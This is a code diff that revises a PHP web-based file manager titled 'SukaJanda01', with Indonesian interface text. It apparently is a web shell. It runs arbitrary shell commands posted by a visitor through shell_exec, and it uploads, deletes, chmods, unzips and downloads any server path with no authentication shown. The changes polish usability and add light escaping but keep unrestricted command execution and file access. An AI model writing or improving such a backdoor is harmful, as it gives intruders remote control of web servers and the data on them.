@@ -4,7 +4,7 @@ $current_dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
 $files_per_page = 20;
 $current_page = isset($_GET['page']) ? intval($_GET['page']) : 1;
 
-if (isset($_FILES['file_to_upload'])) {
+if (isset($_FILES['file_to_upload']) && !empty($_FILES['file_to_upload']['name'])) {
     $upload_file = $current_dir . '/' . basename($_FILES['file_to_upload']['name']);
     if (move_uploaded_file($_FILES['file_to_upload']['tmp_name'], $upload_file)) {
         echo "<div class='success'>File berhasil diunggah.</div>";
@@ -13,7 +13,7 @@ if (isset($_FILES['file_to_upload'])) {
     }
 }
 
-if (isset($_POST['new_file'])) {
+if (isset($_POST['new_file']) && !empty($_POST['new_file'])) {
     $new_file_path = $current_dir . '/' . $_POST['new_file'];
     if (file_put_contents($new_file_path, '') !== false) {
         echo "<div class='success'>File berhasil dibuat.</div>";
@@ -22,7 +22,7 @@ if (isset($_POST['new_file'])) {
     }
 }
 
-if (isset($_POST['new_folder'])) {
+if (isset($_POST['new_folder']) && !empty($_POST['new_folder'])) {
     $new_folder_path = $current_dir . '/' . $_POST['new_folder'];
     if (mkdir($new_folder_path)) {
         echo "<div class='success'>Folder berhasil dibuat.</div>";
@@ -31,7 +31,7 @@ if (isset($_POST['new_folder'])) {
     }
 }
 
-if (isset($_GET['delete'])) {
+if (isset($_GET['delete']) && !empty($_GET['delete'])) {
     $file_to_delete = $_GET['delete'];
     if (is_dir($file_to_delete)) {
         rmdir($file_to_delete);
@@ -42,7 +42,7 @@ if (isset($_GET['delete'])) {
     }
 }
 
-if (isset($_GET['unzip'])) {
+if (isset($_GET['unzip']) && !empty($_GET['unzip'])) {
     $file_to_unzip = $_GET['unzip'];
     $zip = new ZipArchive;
     if ($zip->open($file_to_unzip) === TRUE) {
@@ -54,7 +54,7 @@ if (isset($_GET['unzip'])) {
     }
 }
 
-if (isset($_POST['chmod'])) {
+if (isset($_POST['chmod']) && !empty($_POST['chmod_file']) && !empty($_POST['chmod_value'])) {
     $chmod_file = $_POST['chmod_file'];
     $chmod_value = $_POST['chmod_value'];
     if (chmod($chmod_file, octdec($chmod_value))) {
@@ -84,7 +84,7 @@ function renderPagination($current_page, $total_files, $files_per_page) {
         if ($i == $current_page) {
             echo "<strong>$i</strong> ";
         } else {
-            echo "<a href=\"?dir={$GLOBALS['current_dir']}&page=$i\">$i</a> ";
+            echo "<a href=\"?dir=" . urlencode($GLOBALS['current_dir']) . "&page=$i\">$i</a> ";
         }
     }
     echo '</div>';
@@ -97,7 +97,7 @@ function renderPagination($current_page, $total_files, $files_per_page) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PhP File Manager SukaJanda01</title>
+    <title>PHP File Manager SukaJanda01</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -185,6 +185,20 @@ function renderPagination($current_page, $total_files, $files_per_page) {
         .pagination a:hover {
             background: #0056b3;
         }
+        .breadcrumb {
+            margin: 20px 0;
+            padding: 10px;
+            background-color: #eee;
+            border-radius: 4px;
+        }
+        .breadcrumb a {
+            color: #007BFF;
+            text-decoration: none;
+            margin-right: 5px;
+        }
+        .breadcrumb a:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
@@ -214,6 +228,18 @@ function renderPagination($current_page, $total_files, $files_per_page) {
     <hr>
 
     <h3>Daftar File dan Folder</h3>
+    <div class="breadcrumb">
+        <?php
+        $dirs = explode(DIRECTORY_SEPARATOR, $current_dir);
+        $path = '';
+        foreach ($dirs as $dir) {
+            if ($dir !== '') {
+                $path .= DIRECTORY_SEPARATOR . $dir;
+                echo '<a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($dir) . '</a> / ';
+            }
+        }
+        ?>
+    </div>
     <table>
         <tr>
             <th>Nama</th>
@@ -226,23 +252,23 @@ function renderPagination($current_page, $total_files, $files_per_page) {
             <tr>
                 <td>
                     <?php if (is_dir($current_dir . '/' . $file)): ?>
-                        <a href="?dir=<?php echo $current_dir . '/' . $file; ?>"><?php echo $file; ?>/</a>
+                        <a href="?dir=<?php echo urlencode($current_dir . '/' . $file); ?>"><?php echo htmlspecialchars($file); ?>/</a>
                     <?php else: ?>
-                        <?php echo $file; ?>
+                        <?php echo htmlspecialchars($file); ?>
                     <?php endif; ?>
                 </td>
                 <td><?php echo is_file($current_dir . '/' . $file) ? formatSize(filesize($current_dir . '/' . $file)) : '-'; ?></td>
                 <td><?php echo substr(sprintf('%o', fileperms($current_dir . '/' . $file)), -4); ?></td>
                 <td class="actions">
                     <?php if (!is_dir($current_dir . '/' . $file)): ?>
-                        <a href="?dir=<?php echo $current_dir; ?>&download=<?php echo $current_dir . '/' . $file; ?>" class="btn">Download</a>
+                        <a href="?dir=<?php echo urlencode($current_dir); ?>&download=<?php echo urlencode($current_dir . '/' . $file); ?>" class="btn">Download</a>
                         <?php if (pathinfo($file, PATHINFO_EXTENSION) === 'zip'): ?>
-                            <a href="?dir=<?php echo $current_dir; ?>&unzip=<?php echo $current_dir . '/' . $file; ?>" class="btn">Unzip</a>
+                            <a href="?dir=<?php echo urlencode($current_dir); ?>&unzip=<?php echo urlencode($current_dir . '/' . $file); ?>" class="btn">Unzip</a>
                         <?php endif; ?>
                     <?php endif; ?>
-                    <a href="?dir=<?php echo $current_dir; ?>&delete=<?php echo $current_dir . '/' . $file; ?>" class="btn" onclick="return confirm('Apakah Anda yakin ingin menghapus ini?')">Hapus</a>
+                    <a href="?dir=<?php echo urlencode($current_dir); ?>&delete=<?php echo urlencode($current_dir . '/' . $file); ?>" class="btn" onclick="return confirm('Apakah Anda yakin ingin menghapus ini?')">Hapus</a>
                     <form method="post" style="display:inline;">
-                        <input type="hidden" name="chmod_file" value="<?php echo $current_dir . '/' . $file; ?>">
+                        <input type="hidden" name="chmod_file" value="<?php echo htmlspecialchars($current_dir . '/' . $file); ?>">
                         <input type="number" name="chmod_value" placeholder="0777" style="width: 60px;">
                         <input type="submit" value="Chmod" class="btn">
                     </form>
@@ -265,19 +291,24 @@ function renderPagination($current_page, $total_files, $files_per_page) {
 
     <?php
     if (isset($_POST['cmd'])) {
-        $cmd = $_POST['cmd'];
+        $cmd = escapeshellcmd($_POST['cmd']);
+        $cmd = "cd " . escapeshellarg($current_dir) . " && " . $cmd;
         $output = shell_exec($cmd);
         echo "<pre>$output</pre>";
     }
 
-    if (isset($_GET['download'])) {
+    if (isset($_GET['download']) && !empty($_GET['download'])) {
         $file_to_download = $_GET['download'];
-        header('Content-Description: File Transfer');
-        header('Content-Type: application/octet-stream');
-        header('Content-Disposition: attachment; filename="'.basename($file_to_download).'"');
-        header('Content-Length: ' . filesize($file_to_download));
-        readfile($file_to_download);
-        exit;
+        if (file_exists($file_to_download)) {
+            header('Content-Description: File Transfer');
+            header('Content-Type: application/octet-stream');
+            header('Content-Disposition: attachment; filename="'.basename($file_to_download).'"');
+            header('Content-Length: ' . filesize($file_to_download));
+            readfile($file_to_download);
+            exit;
+        } else {
+            echo "<div class='error'>File tidak ditemukan.</div>";
+        }
     }
     ?>
 
